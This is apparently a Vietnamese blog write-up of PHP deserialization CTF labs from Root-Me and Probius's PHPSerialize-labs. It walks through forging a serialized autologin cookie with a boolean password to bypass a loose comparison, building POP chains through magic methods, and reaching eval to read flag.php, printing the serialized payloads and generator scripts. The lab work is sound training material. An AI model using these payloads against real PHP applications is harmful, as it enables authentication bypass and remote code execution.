---
title: PHP Deserialize challenge write-up
date: 2025-07-25 00:00:00 +0007
categories: [Write-up]
tags: [deserialization, php, rootme]

image:
  path: /assets/img/2025-07-25-PHPDeserChall/cover.png

description: "My write-up for some PHP Deserialization challenges"

---

### Rootme: PHP - Serialization 

> **[https://challenge01.root-me.org/web-serveur/ch28/](https://challenge01.root-me.org/web-serveur/ch28/)**

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image1.png" | relative_url }})

Sau khi đọc source, ta được biết target của challenge là login as admin cụ thể là user `superadmin`, và sẽ có 2 cách để authenticate:
- 1: login với một tài khoản chính xác
- 2: Sử dụng header cookie với giá trị `autologin=.....` là một serialized data để đăng nhập

```php
    if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
```

Hai điểm ta cần lưu ý, đầu tiên là việc unserialize user input và tiếp theo là loose comparison tại `$data['password'] == $auth[ $data['login'] ]`
- Để có thể qua được cửa đầu tiên, mình dễ dàng sửa serialize data từ guest thành superadmin, và thay thế độ dài tương ứng
- Thay vì để so sánh 2 string và ta rõ ràng không biết admin's password, mình sẽ tận dụng việc so sánh ở đây là sử dụng `==` thay vì `===`. Ta có thể [đọc thêm về vấn đề này trong php tại đây](https://viblo.asia/p/php-type-juggling-924lJPYWKPM)

Nói một cách đơn giản, khi so sánh 2 kiểu dữ liệu khác nhau thông qua `==` của php, ngôn ngữ này sẽ tiến hành ép kiểu dữ liệu sao cho nó giống nhau rồi mới so sánh. 

Trong trường hợp challenge này, mình sẽ cố tình đưa vào serialize data dạng như sau: `a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}`, để khi unserialize mình sẽ có một data với login là superadmin, còn password thay vì là một string, nó sẽ nhận giá trị của một biến boolean khi này là true

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image2.png" | relative_url }})

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image3.png" | relative_url }})


Từ đó, `TRUE == "real_admin_password"` sẽ bằng true và mình đã qua mặt được cách chương trình cấp quyền cho admin

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image4.png" | relative_url }})

---

### Rootme: PHP - Unserialize POP Chain

Một challenge với target là login thành công để lấy flag, mình đọc source để hiểu cách họ authenticate khi đăng nhập như thế nào:

```php
<?php

$getflag = false;

class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }

    function __toString() {
        return $this->receive;
    }

    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't seem to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG."<br>";
            }
        }
    }
}

class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }

    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

if (isset($_POST["data"]) && !empty($_POST["data"])) {
    unserialize($_POST["data"]);
}

?>
```

Giờ thì mình sẽ phân tích những điểm đáng chú ý, cụ thể là để lấy được flag ta cần invoke được method `__destruct()` của class `GetMessage` điều này thì không khó khi sẽ tự được gọi khi kết thúc, nhưng vấn đề nằm ở những điều kiện cần vượt qua để lấy được flag:
- 1 là biến `receive` khi `__destruct()` được gọi phải có giá trị là `HelloBooooooy`, nhưng không đơn giản chỉ là như vậy, bởi nếu `receive` nhận giá trị như trên khi method `__construct()` của `GetMessage` được gọi thì chương trình sẽ `die` ngay và khi đó ta không thể invoke được `__destruct()` từ đó gọi flag nữa
- 2 là giá trị `$getflag` phải bằng true, biến này được khởi tạo global với giá trị mặc định là false dẫn tới để thoả mãn điều kiện. Ta bắt buộc phải invoke được `__toString()` của class `WaKyWaKy`

Vậy là mục tiêu được đề ra đã rõ ràng, giờ mình cần tìm cách hiện thực hoá chúng bằng cách tạo ra một serialized data sao cho khi được unserialized thì nó tạo ra đúng những gì mình mong muốn

Nhìn chung lại, cả 2 điều kiện đều hướng tới một mục tiêu đó là `__toString()` của class WaKyWaKy phải được invoke, lý do là bởi:
- Để getflag bằng true thì đây invoke được method này là con đường duy nhất
- Nhưng khi bắt buộc phải invoke method này, ta không thể ngang nhiên gán `receive` bằng `HelloBooooooy` vì khi đó chương trình die ngay vì method `__toString()` của class WaKyWaKy đã invoke `__construct()` của class Get Message thông qua việc khởi toạ một object 

Một lưu ý khác mình nhận ra là strict comparison ở chỗ so sánh `$receive === "HelloBooooooy"` nếu $receive là một object sẽ không invoke `__toString()`. Cái này cũng rất mới =))

---

#### Giải thích solution

**Và cuối cùng mình đã không làm được** =)) Sau đó mình quyết định đi đọc writeup, nhưng thật sự để mà nói từ việc đọc writeup tới giải thích được rõ ràng tường tận payload hoạt động như nào là rất khó. Mình bỏ cuộc mấy lần đi làm mục khác của task cho giải trí nhưng cuối cùng vẫn quyết định debug để làm rõ ràng mọi việc

code debug final của mình (vì mình lười cài debugger, nhưng chắc sẽ cài vào một ngày nào đó)

```php
<?php
    
$getflag = false;
    
class GetMessage {

    public $receive;

    function __construct($receive) {
        echo "DEBUG WAS HERE \n";
        var_dump($receive);
        echo "DEBUG WAS HERE \n";
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!\n");
        } else {
            $this->receive = $receive;
        }
    }
    
    function __toString() {
        echo "toString GetMessage was called?\n" ;
        return $this->receive;
    }
    
    function __destruct() {
        echo "destruct is called\n";

        var_dump($this);

        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..\n");
        } else {
            if ($getflag) {
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: \n";
            }
        }
    }
}
    
class WakyWaky {
    public $msg;
    function __wakeup() {
        echo "wakeup11111 WAS HERE RIGHT?\n";
        echo "class of \$this->msg = " . get_class($this->msg) . "\n";
        echo "[YOU]: ".$this->msg."\n"; // trong wakeup lần 2 gọi outer waky => this->msg khi này là inner waky, và inner waky là thằng bị gọi tostring?
        echo "wakeup22222 WAS HERE RIGHT?\n";
    }
    
    function __toString() {
        echo "toString WakyWaky was here right?\n";
        echo "class of \$this->msg = " . get_class($this->msg) . "\n"; // vì inner waky là thằng bị gọi tostring => this->msg truyền vào khi này là object GetMessage, đúng như kết quả var_dump
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
        // O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}
    }
}
    
$tmp = 'O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}';
unserialize($tmp);

?>
```


Và kết quả ta có log debug là:
```
┌──(anhcd㉿MSI)-[/mnt/e/TrainingVCI/Week 7/images]
└─$ php idk.php
    wakeup11111 WAS HERE RIGHT?
toString GetMessage was called?
[YOU]: HelloBooooooy
wakeup22222 WAS HERE RIGHT?
wakeup11111 WAS HERE RIGHT?
toString WakyWaky was here right?
[FRIEND]: Hm.. you don't see to be the friend I was waiting for..
[FRIEND]: Oh ! Hi! Let me show you my secret: 
```

Như vậy là mọi thứ sau khi gõ echo để debug ra đã rất rõ ràng, giờ mình mới hiểu được luồng của chương trình thực sự chạy như nào

Với payload `O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}`, chương trình sẽ hiểu và thực thi unserialize như sau: (ở đây có 2 object wakywaky, mình sẽ gọi cái ngoài cùng bên trái là ngoài, còn cái ở giữa là trong)



Đầu tiên, wakeup sẽ được gọi bởi wakywaky bên trong. Vì sao mình biết điều này? Vì ngay bên dưới có dòng toString GetMessage was called, mà rõ ràng là trong bài nếu strict comparison không được gọi thì làm gì còn chỗ nào nữa. Nhưng mình đã nhầm khi echo thì rõ ràng đã kích hoạt toString, chỉ là khi đấy this->msg đang là gì, và mình đã dump ra thêm bằng `echo "class of \$this->msg = " . get_class($this->msg) . "\n";`

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image5.png" | relative_url }})

Sau khi hoàn thành chuyển đổi từ object sang string, vậy là đã có thể echo được => Ta có dòng `[YOU]: HelloBooooooy`, và wakeup22222 xuất hiện báo hiệu cho việc kết thúc của WakyWaky trong

Đến với Wakywaky ngoài, khi này echo thay vì trigger toString của GetMessage sẽ phải trigger của Wakywaky bởi vì `$this->msg` bây giờ là object của wakywaky cơ mà => $getflag = true, construct của GetMessage được gọi để so sánh Object GetMessage với một string và như mình đã nói là strict comparison không gọi toString => False

Vậy là khi này đã return về giá trị, tức không còn tham chiếu nào trỏ tới đối tượng GetMessage vừa được tạo ra bằng new nữa => destruct được gọi ở đây để huỷ đi thằng GetMessage được tạo mới (Gọi là `#4`)

Đến đoạn này mình bị đấu tranh tư tưởng, mình có đọc một vài bài writeup họ bảo là die không gọi destruct? Nhưng theo một comment trong php.net thì die không hề khiến chương trình thoát luôn mà nó vẫn trải qua quá trình clean-up

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image6.png" | relative_url }})

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image7.png" | relative_url }})

Tức là khi này tiếp tục gọi destruct của những object còn sống, bao gồm `#1 - WakyWaky ngoài`, `#2 Wakywaky trong` và `#3 GetMessage`. Nhưng chỉ có mỗi thằng `#3` là có hàm huỷ => Gọi hàm huỷ của `#3` với GetMessage khi này là 1 object có receive là HelloBoy => Solved

Vậy là đã kết thúc hẹ hẹ hẹ

---

### Chuỗi challenge PHP deser by Probius

> Source: [https://github.com/ProbiusOfficial/PHPSerialize-labs](https://github.com/ProbiusOfficial/PHPSerialize-labs)

Sau khi thử sức với các challenge root-me thì mình nhận ra hiện tại trình độ làm dạng POP của mình còn khá kém, nên mình đã đi tìm thêm lab để làm. Đầu tiên chúng ta có chuỗi challenge này, có tổng cộng 18 level nhưng mình sẽ viết lại wu của 4 level cuối, dạng mà mình muốn học thêm

Mình làm những bài này khá sớm, nhưng sau đó mới quyết định ghi lại wu nên làm lại 1 lần nữa =))) giúp cho việc nhớ khá lâu và giờ mình cũng tự tin vào khả năng xây payload pop của bản thân

Mục tiêu chung của all challenge trong này là lấy được flag `HelloCTF{Default_Flag}`

#### Level 15

```php
/* FLAG in flag.php */

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}
class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}
class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
```

Như đề bài đã thông báo, flag nằm ở `flag.php` như vậy là ta cần tìm sink nào cho phép ít nhất là LFI để đọc file flag. Dễ dàng nhận thấy ở class `destnation` có `eval()` có khả năng làm được việc này

Vậy là target đã có, giờ là lúc đi ngược lại để tìm cách trigger. Thứ tự mình xây dựng sẽ như sau:
- Giá trị được eval sẽ là `$this->cmd->a->b->c`, được kích hoạt bằng method action của class destnation (chắc là destination mà mấy ông b trung của viết sai chính tả). Như vậy là đầu tiên, trigger được action và cái `$this->cmd` có property `$a`
- `action` sẽ được trigger bởi magic method `__wakeup()` trong class D, điều này dễ dành thực hiện bằng cách truyền vào lệnh unserialize object D ở ngoài cùng
- Giờ thì mình set up sao cho giá trị của `$this->cmd->a->b->c` là câu lệnh mình muốn thực thi => Solved

Script:

```php
$data1 = new C("echo file_get_contents('flag.php');");
$data2 = new B($data1);
$data3 = new A($data2);
$data4 = new destnation($data3);
$data5 = new D($data4);

echo serialize($data5);
```

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image8.png" | relative_url }})

#### Level 16

```php
class A {
    public $a;
    public function __invoke() {
            include $this->a;
            return $flag;
    }
}

class B {
    public $b;
    public function __toString() {
        $f = $this->b;
        return $f();
    }
}


class INIT {
    public $name;
    public function __wakeUp() {
        echo $this->name.' is awake!';
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
```

Flag được return khi trigger được `__invoke()` của class A

Về magic method `__invoke()`, method này được kích hoạt khi một class được đối xử như một function. Trong challenge này, dễ dàng nhìn thấy trong class B, method `__toString()` sẽ `return $f();` tức đang làm chính xác những gì mình cần

Như vậy flow của payload solve sẽ là:
- Unserialize và gọi `__wakeup` của class INIT, từ đó có một lệnh echo object => Trigger `__toString()` của object
- Trong `__toString()` của class B, ta set up giá trị `$f` là object A => return object A as a function sẽ gọi `__invoke()` => Solved
- À ngoài ra để có biến `$flag` để return, ta cần include file flag.php bằng cách set giá trị `$a = flag.php`

Solved script:

```php
$data1 = new A("");
$data1->a = "flag.php";
$data2 = new B("");
$data2->b = $data1;
$data3 = new INIT();
$data3->name = $data2;

echo serialize($data3);
```

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image9.png" | relative_url }})

#### Level 17

```php
class A {

}
echo "Class A is NULL: '".serialize(new A())."'<br>";

class B {
    public $a = "Hello";
    protected $b = "CTF";
    private $c = "FLAG{TEST}";
}
echo "Class B is a class with 3 properties: '".serialize(new B())."'<br>";

$serliseString = serialize(new B());

$serliseString = str_replace('B', 'A', $serliseString);

echo "After replace B with A,we unserialize it and dump :<br>";
var_dump(unserialize($serliseString));

if(isset($_POST['o'])) {
    $a = unserialize($_POST['o']);
    var_dump($a);
    if ($a instanceof A && $a->helloctfcmd == "get_flag") {
        include 'flag.php';
        echo $flag;
    } else {
        echo "what's rule?";
    }
} else {
    highlight_file(__FILE__);
}
```

Ta chú ý vào điều kiện để lấy được flag `$a instanceof A && $a->helloctfcmd == "get_flag"`:
- Đầu tiên, biến `$a` sau khi unserialize phải là 1 instance của A, sau khi đọc doc một chút thì mình hiểu khi này `$a` phải là 1 object của class A
- Giá trị property `helloctfcmd` của $a khi này phải là `get_flag`

Thật sự thì đoạn trên gồm class B và một đống echo mình chưa hiểu tác dụng là gì lắm =)) nhưng có vẻ nó k có ý nghĩa trong việc lấy được flag của bài này 

Vậy nên code solve đơn giản của bài này là 

```php
<?php

class A {
    public $helloctfcmd;
}

$data = new A("");
$data->helloctfcmd = "get_flag";
echo serialize($data);
// O:1:"A":1:{s:11:"helloctfcmd";s:8:"get_flag";}
```

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image10.png" | relative_url }})

#### Level 18

```php
highlight_file('source');

class Demo {
    public $a = "Hello";
    public $b = "CTF";
    public $key = 'GET_FLAG";}FAKE_FLAG';
}

class FLAG {

}

$serliseStringDemo = serialize(new Demo());
echo "SerliseStringDemo:'".$serliseStringDemo."'<br>";

echo "Change SOMETHING TO GET FLAG";

$target = $_GET['target'];
$change = $_GET['change'];

$serliseStringFLAG = str_replace($target, $change, $serliseStringDemo);

$FLAG = unserialize($serliseStringFLAG);

if ($FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG') {
    include 'flag.php';
    echo $flag;
} else {
    echo "Your serliaze string is ".$serliseStringFLAG . "<br> And Here is ";
    var_dump($FLAG);
}
```

Khác với các level khác, giờ ta sẽ nhận vào 2 tham số là target và change, cụ thể chúng sẽ được sử dụng để:

```php
$serliseStringFLAG = str_replace($target, $change, $serliseStringDemo);
```

Với giá trị của biến `$serliseStringDemo` là cố định, luôn là `O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}`

Để lấy được flag từ challenge, ta phải thoả mãn những điều kiện: `$FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG'`
- biến $FLAG là một object của class FLAG, với biến $FLAG nhận giá trị là `$serliseStringFLAG`
- Giá trị của property key của FLAG phải là GET_FLAG

Ban đầu, mình chỉ tìm cách thay đổi giá trị của biến key thành chính xác GET_FLAG, nhưng điều này gặp một trở ngại là độ dài hiện đang được set là 20, nên kể cả có thay đổi đúng thì unserialize cũng đấm mình và trả về error

```
target=";}FAKE_FLAG&change=

=> O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}
```

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image11.png" | relative_url }})

Loay hoay một hồi tìm cách, rồi mình nghĩ tại sao không thay tất cả serialized data đang có thành cái mình muốn? Và đó là có vẻ như cũng là cách đúng trong challenge này

```!
?target=O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}&change=O:4:"FLAG":1:{s:3:"key";s:8:"GET_FLAG";}

tức mình đổi serialized data có sẵn thành một Object Flag với key là GET_FLAG
```

![image]({{ "/assets/img/2025-07-25-PHPDeserChall/image12.png" | relative_url }})